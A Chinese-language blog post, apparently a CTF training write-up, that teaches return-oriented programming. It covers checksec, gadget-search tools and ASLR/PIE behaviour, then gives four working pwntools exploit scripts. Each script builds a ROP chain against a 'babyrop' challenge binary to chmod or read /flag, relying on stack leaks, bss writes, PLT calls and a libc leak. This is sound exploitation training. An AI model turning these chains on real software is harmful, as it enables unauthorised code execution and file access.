---
layout: post
tags: [pwn]
title: "ROP 利用手法"
author: wsxk
date: 2025-1-15
comments: true
---

- [0. checksec起手](#0-checksec起手)
- [1. ROP gadgets 搜索](#1-rop-gadgets-搜索)
  - [1.1 ROPgadget](#11-ropgadget)
  - [1.2 one\_gadget](#12-one_gadget)
  - [1.3 rp++](#13-rp)
- [2. ROP 防御绕过技巧](#2-rop-防御绕过技巧)
  - [2.1 只开启ASLR(Address Space Layout Randomization)和NX，no-pie](#21-只开启aslraddress-space-layout-randomization和nxno-pie)
    - [2.1.1 泄露stack地址完成绕过](#211-泄露stack地址完成绕过)
    - [2.1.2 no-pie写bss段](#212-no-pie写bss段)
    - [2.1.3 没有syscall gadget](#213-没有syscall-gadget)
    - [2.1.4 泄露libc地址](#214-泄露libc地址)

# 0. checksec起手<br>
一般情况下，安装`pwntools`后，就会默认帮你安装`checksec`，这个命令非常好用，主要的功能是帮助你了解程序开启了哪些保护。<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250112103808.png)
```
Arch: 
程序架构，这里告诉你是x86_64

RELRO(read only relocation): 
设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。

Stack: 
有无canary

NX: 
no-execute，即栈不可执行

PIE(position independent executable): 
位置无关代码

SHSTK: 前提条件，开启CET（CONTROL-FLOW ENFORCEMENT TECHNOLOGY）
shadow stack，当shadow stack开启时，CALL指令会把返回地址同时压入数据栈和影子栈（shadow stack），RET指令会把返回地址同时从数据栈和影子栈取出，并比较。
如果从两个栈中取出的返回地址不匹配，那么就会触发控制保护异常（#CP）

IBT: 前提条件，开启CET（CONTROL-FLOW ENFORCEMENT TECHNOLOGY）
indirect branch tracker,应用于间接跳转（jmp/call指令），如果在间接跳转后的下一条指令不是ENDBR32或ENDBR64，就会触发#CP异常。
并不包括RIP相对跳转、远直接jmp跳转、call相对跳转等，这些都是跳转到固定地址，不存在被篡改的可能，因此IBT并不作用于这种情况

Stripped：是否去了符号 

```
总之，开始ctf之前，起手checksec是常规操作<br>

# 1. ROP gadgets 搜索<br>
工欲善其事，必先利其器<br>
ROP中的gadget，人工搜索不现实，这里列出几个常见的好用的rop gadget搜索工具<br>
## 1.1 ROPgadget<br>
`pwntools`安装好后自带的gadget搜索工具<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250113192206.png)
通常情况下，`ROPgadget`能满足绝大部分需求<br>

## 1.2 one_gadget<br>
所谓`one_gadget`，是指一条指令就能`get shell`的指令，通常使用在你已经获得了程序执行用到的`libc`文件后执行。<br>
安装步骤如下:(ubuntu20.04)<br>
```
sudo apt install ruby
sudo apt install gem
sudo gem install elftools -v 1.2.0
sudo gem install one_gadget -v 1.9.0
```

## 1.3 rp++<br>
据说是最好用的gadget搜索工具，搜的比ROPgadget全，如果ROPgadget找不到gadget，不妨试试rp++<br>
在`ubuntu20`上安装过程如下:<br>
```
git clone https://github.com/0vercl0k/rp.git
cd rp/src/build
chmod 777 build-release.sh
sudo apt install cmake
sudo apt install ninja-build
./build-release.sh
cp rp-lin /usr/local/bin/rp++

# 使用
rp++ -f babyrop_level6.1  -r3 --colors
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250120210033.png)

# 2. ROP 防御绕过技巧<br>
## 2.1 只开启ASLR(Address Space Layout Randomization)和NX，no-pie<br>
ASLR和pie的关联和联系是：<br>
```
pie是一种编译选项，即这个程序是否是位置无关的代码；
aslr是系统选项，对于开启了aslr的系统，在加载程序时，会尝试把程序装载到随机的基地址上

如果：
1、关闭aslr
  程序无论是否有pie，装载基地址不变

2、开启aslr，且值为1
  程序没有pie，程序本身装载基地址不变；除heap外的其他部分（如libc、stack等等）会装载在随机地址
  程序有pie，程序本身装载基地址也会变化

3、开启aslr，且值为2
  程序没有pie，程序本身装载基地址不变；其他部分（如libc、stack、heap等等）会装载在随机地址
  程序有pie，程序本身装载基地址也会变化
```

### 2.1.1 泄露stack地址完成绕过<br>
如果你知道`stack`的地址的话,我们可以**引用 写在栈空间上的数据，完成利用**<br>
```python
from pwn import *
context.log_level = 'debug'

p = process("./babyrop_level4.0")
p.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
stack_addr= int(p.recv(12),16)
print("buffer_addr:",hex(stack_addr))

syscall = 0x0000000000402641
pop_rdi_ret = 0x0000000000402669
pop_rsi_ret = 0x0000000000402671
pop_rdx_ret = 0x000000000040264a
pop_rcx_ret = 0x0000000000402662
pop_rax_ret = 0x0000000000402651
payload = b"/flag\x00".ljust(0x50+8,b"a")+ p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_ret)+p64(511)+p64(pop_rax_ret)+p64(90)+p64(syscall)
#print(shellcraft.sh())
p.send(payload)
p.interactive()
```

### 2.1.2 no-pie写bss段<br>
如果系统开启了aslr，但是程序是`no-pie`的，这意味着程序段的地址是固定的，我们可以先在bss段中写入我们想要使用的字符串，比如"/flag"，然后进行二次利用：<br>
**核心思路：bss段的值默认为0；且代码中能够找到`pop rcx; ret`、`pop rax; ret`、`add byte ptr [rcx], al ; pop rbp ; ret`三个gadgets，这样即可直接写入字符串**<br>
```python
from pwn import *
context.log_level = 'debug'

p = process("./babyrop_level5.0")
gdb.attach(p)
pause()

syscall = 0x000000000040270f
pop_rdi_ret = 0x00000000004026df
pop_rsi_ret = 0x00000000004026ff
pop_rdx_ret = 0x00000000004026f0
pop_rcx_ret = 0x0000000000402708
pop_rax_ret = 0x00000000004026e8
# 0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
add_byteptrrcx_al_pop_rbp_ret = 0x000000000040127b

bss_addr = 0x405200
key_string = b"/flag\x00"
payload = b"a".ljust(0x60+8,b"a")
for i in range(len(key_string)):
    payload += p64(pop_rcx_ret)+p64(bss_addr+i)+p64(pop_rax_ret)+p64(key_string[i])+p64(add_byteptrrcx_al_pop_rbp_ret)+p64(0)
payload +=  p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(511)+p64(pop_rax_ret)+p64(90)+p64(syscall)
#print(shellcraft.sh())
p.send(payload)
p.interactive()
```

### 2.1.3 没有syscall gadget<br>
如果没有`syscall gadget`，我们应该如何完成利用呢?<br>
解答：**利用程序已有的plt，一般来说open,read,write都是有的，且调用plt时，无需担心没有ret的问题~;另一点就是利用程序fd是顺序增长的原理，可以猜测open的fd是哪个值**<br>

```python
from pwn import *
context.log_level = 'debug'

p = process("./babyrop_level6.1")
gdb.attach(p,"b *0x0000000000401c58")
pause()


pop_rdi_ret = 0x0000000000401c58
pop_rsi_ret = 0x0000000000401c50
pop_rdx_ret = 0x0000000000401c48
pop_rcx_ret = 0x0000000000401c40
bss_addr = 0x404200
key_string = b"/flag\x00"
key_string_len = len(key_string)
read_addr = 0x4010D0
open_addr = 0x401100
sendfile_addr = 0x4010E0

payload = b"a".ljust(0x20+8,b"a")
payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_addr)+p64(pop_rdx_ret)+p64(key_string_len) + p64(read_addr) # read "/flag" 
payload += p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr) # open /flag
payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(3)+p64(pop_rdx_ret)+p64(0)+p64(pop_rcx_ret)+p64(100)+p64(sendfile_addr) # sendlife(stdout,/flag,0,100)
p.send(payload)

p.send(key_string)
p.interactive()
```

### 2.1.4 泄露libc地址<br>
如果能知道`libc地址`的话，我们就能够借助`libc`里的函数来完成rop链子的构造:<br>
**核心思路是，在得知libc地址后，在libc里搜索必须的gadget，完成利用**<br>
```python
from pwn import *
context.log_level = 'debug'

libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
p = process("/challenge/babyrop_level7.0")
libc = ELF(libc_path)

#gdb.attach(p,"b *0x4024F3")
#pause()

p.recvuntil(b'[LEAK] The address of "system" in libc is: 0x')
system_addr = int(p.recv(12),16)
print("system_addr:",hex(system_addr))
libc.address = system_addr - libc.symbols["system"]
chmod_addr = libc.symbols["chmod"]
print("chmod_addr:",hex(chmod_addr))

bss_addr = 0x405200
pop_rdi_ret = 0x0000000000023b6a + libc.address
pop_rsi_ret = 0x000000000002601f + libc.address
pop_rdx_ret_0x10 =  0x00000000000dfc12 + libc.address
read_plt = 0x401150

print("pop_rdi_ret addr:",hex(pop_rdi_ret))
payload = b"a".ljust(0x40+8,b"a")
payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_addr)+p64(pop_rdx_ret_0x10)+p64(0x100)+p64(read_plt)+p64(0)+p64(0) # read(0,bss,0x100) # ret 10 = ret; add rsp, 10
payload += p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(511)+p64(libc.symbols["chmod"]) #chmod("/flag",511)

p.send(payload)
p.send(b"/flag")
p.interactive()
```